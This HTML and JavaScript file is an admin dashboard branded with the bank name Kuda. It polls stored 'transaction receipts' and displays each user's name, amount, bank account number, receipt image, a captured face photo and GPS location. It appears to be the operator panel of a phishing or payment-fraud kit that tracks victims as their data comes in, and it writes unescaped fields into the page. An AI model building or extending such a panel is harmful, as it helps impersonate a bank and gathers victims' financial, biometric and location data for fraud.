<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - Kuda</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f5; }
        .admin-wrapper { display: flex; min-height: 100vh; }
        .admin-sidebar { width: 250px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; }
        .admin-sidebar h1 { font-size: 20px; margin-bottom: 30px; }
        .admin-nav-item { padding: 12px; border-radius: 8px; cursor: pointer; background: rgba(255,255,255,0.1); margin-bottom: 10px; }
        .admin-nav-item:hover { background: rgba(255,255,255,0.2); }
        .admin-main { flex: 1; display: flex; flex-direction: column; }
        .admin-header { background: white; padding: 20px 30px; border-bottom: 1px solid #e0e0e0; display: flex; justify-content: space-between; align-items: center; }
        .admin-header h2 { font-size: 24px; color: #333; }
        .admin-logout { padding: 10px 20px; background: #e74c3c; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; }
        .admin-logout:hover { background: #c0392b; }
        .admin-content { flex: 1; overflow-y: auto; padding: 20px 30px; }
        .admin-stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .admin-stat-card { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
        .admin-stat-label { font-size: 14px; color: #999; text-transform: uppercase; margin-bottom: 10px; }
        .admin-stat-value { font-size: 32px; font-weight: 700; color: #667eea; }
        .admin-receipts { background: white; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
        .admin-receipts-header { padding: 20px; border-bottom: 1px solid #e0e0e0; font-size: 18px; font-weight: 600; color: #333; }
        .admin-receipts-list { max-height: 600px; overflow-y: auto; }
        .admin-receipt-item { padding: 15px 20px; border-bottom: 1px solid #f0f0f0; }
        .admin-receipt-item:hover { background: #f9f9f9; }
        .admin-receipt-username { font-weight: 600; color: #333; }
        .admin-receipt-time { font-size: 12px; color: #999; float: right; }
        .admin-receipt-details { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 10px; font-size: 13px; }
        .admin-receipt-detail { color: #666; }
        .admin-receipt-images { display: flex; gap: 10px; margin-top: 10px; }
        .admin-receipt-image { width: 80px; height: 80px; border-radius: 6px; object-fit: cover; cursor: pointer; }
        .admin-empty { text-align: center; padding: 40px; color: #999; }
        .admin-modal { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
        .admin-modal.show { display: flex; }
        .admin-modal-content { background: white; border-radius: 12px; max-width: 600px; width: 100%; overflow-y: auto; max-height: 80vh; }
        .admin-modal-header { padding: 20px; border-bottom: 1px solid #e0e0e0; display: flex; justify-content: space-between; align-items: center; }
        .admin-modal-header h3 { font-size: 20px; color: #333; }
        .admin-modal-close { background: none; border: none; font-size: 24px; cursor: pointer; }
        .admin-modal-body { padding: 20px; }
        .admin-modal-image { width: 100%; border-radius: 8px; margin-bottom: 20px; }
        .admin-detail-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f0f0f0; }
    </style>
</head>
<body>
    <div class="admin-wrapper">
        <div class="admin-sidebar">
            <h1>Admin</h1>
            <div class="admin-nav-item">All Receipts</div>
            <div class="admin-nav-item" onclick="logout()">Logout</div>
        </div>
        <div class="admin-main">
            <div class="admin-header">
                <h2>Transaction Receipts</h2>
                <button class="admin-logout" onclick="logout()">Logout</button>
            </div>
            <div class="admin-content">
                <div class="admin-stats">
                    <div class="admin-stat-card">
                        <div class="admin-stat-label">Total Transactions</div>
                        <div class="admin-stat-value" id="totalReceipts">0</div>
                    </div>
                    <div class="admin-stat-card">
                        <div class="admin-stat-label">Today</div>
                        <div class="admin-stat-value" id="todayReceipts">0</div>
                    </div>
                    <div class="admin-stat-card">
                        <div class="admin-stat-label">Total Amount</div>
                        <div class="admin-stat-value" id="totalAmount">₦0</div>
                    </div>
                </div>
                <div class="admin-receipts">
                    <div class="admin-receipts-header">Recent Transactions</div>
                    <div class="admin-receipts-list" id="receiptsList">
                        <div class="admin-empty">📭 Waiting for transactions...</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="admin-modal" id="receiptModal">
        <div class="admin-modal-content">
            <div class="admin-modal-header">
                <h3>Receipt Details</h3>
                <button class="admin-modal-close" onclick="closeModal()">&times;</button>
            </div>
            <div class="admin-modal-body" id="modalBody"></div>
        </div>
    </div>

    <script src="js/storage.js"></script>
    <script>
        window.addEventListener('load', async () => {
            await storage.init();
            loadReceipts();
            setInterval(loadReceipts, 2000);
        });

        async function loadReceipts() {
            const receipts = await storage.getAllReceipts();
            const receiptsList = document.getElementById('receiptsList');
            if (receipts.length === 0) {
                receiptsList.innerHTML = '<div class="admin-empty">📭 Waiting for transactions...</div>';
            } else {
                receiptsList.innerHTML = receipts.map(r => `
                    <div class="admin-receipt-item" onclick="viewReceipt(${r.id})">
                        <span class="admin-receipt-username">👤 ${r.username}</span>
                        <span class="admin-receipt-time">${formatTime(r.timestamp)}</span>
                        <div style="clear: both;"></div>
                        <div class="admin-receipt-details">
                            <div>Amount: ₦${r.amount}</div>
                            <div>Bank: ${r.bankName}</div>
                            <div>Ref: ${r.referenceNumber}</div>
                            <div>Account: ${r.accountNumber}</div>
                        </div>
                        ${r.location ? `<a href="https://maps.google.com/?q=${r.location.latitude},${r.location.longitude}" target="_blank" style="color:#667eea;font-size:12px;">📍 View on Maps</a>` : ''}
                        <div class="admin-receipt-images">
                            ${r.receiptImage ? `<img src="${r.receiptImage}" class="admin-receipt-image">` : ''}
                            ${r.capturedFace ? `<img src="${r.capturedFace}" class="admin-receipt-image">` : ''}
                        </div>
                    </div>
                `).join('');
            }
            updateStats(receipts);
        }

        function updateStats(receipts) {
            const today = new Date().toLocaleDateString();
            const todayCount = receipts.filter(r => new Date(r.timestamp).toLocaleDateString() === today).length;
            const total = receipts.reduce((sum, r) => sum + parseFloat(r.amount || 0), 0);
            document.getElementById('totalReceipts').textContent = receipts.length;
            document.getElementById('todayReceipts').textContent = todayCount;
            document.getElementById('totalAmount').textContent = '₦' + total.toLocaleString();
        }

        function viewReceipt(id) {
            storage.getAllReceipts().then(receipts => {
                const receipt = receipts.find(r => r.id === id);
                if (receipt) {
                    const modalBody = document.getElementById('modalBody');
                    modalBody.innerHTML = `
                        ${receipt.receiptImage ? `<img src="${receipt.receiptImage}" class="admin-modal-image">` : ''}
                        ${receipt.capturedFace ? `<img src="${receipt.capturedFace}" class="admin-modal-image">` : ''}
                        <div class="admin-detail-row"><span>Username</span><span>${receipt.username}</span></div>
                        <div class="admin-detail-row"><span>Amount</span><span>₦${receipt.amount}</span></div>
                        <div class="admin-detail-row"><span>Bank</span><span>${receipt.bankName}</span></div>
                        <div class="admin-detail-row"><span>Account</span><span>${receipt.accountNumber}</span></div>
                        <div class="admin-detail-row"><span>Reference</span><span>${receipt.referenceNumber}</span></div>
                        ${receipt.location ? `<div class="admin-detail-row"><span>Location</span><span>${receipt.location.latitude.toFixed(4)}, ${receipt.location.longitude.toFixed(4)}</span></div>` : ''}
                    `;
                    document.getElementById('receiptModal').classList.add('show');
                }
            });
        }

        function closeModal() {
            document.getElementById('receiptModal').classList.remove('show');
        }

        function formatTime(timestamp) {
            const date = new Date(timestamp);
            const now = new Date();
            const diffMs = now - date;
            const diffMins = Math.floor(diffMs / 60000);
            const diffHours = Math.floor(diffMs / 3600000);
            const diffDays = Math.floor(diffMs / 86400000);
            if (diffMins < 1) return 'just now';
            if (diffMins < 60) return `${diffMins}m ago`;
            if (diffHours < 24) return `${diffHours}h ago`;
            if (diffDays < 7) return `${diffDays}d ago`;
            return date.toLocaleDateString();
        }

        function logout() {
            fetch('/api/logout', { method: 'POST' }).then(() => {
                window.location.href = '/admin-login';
            });
        }

        document.getElementById('receiptModal').addEventListener('click', (e) => {
            if (e.target.id === 'receiptModal') closeModal();
        });
    </script>
</body>
</html>
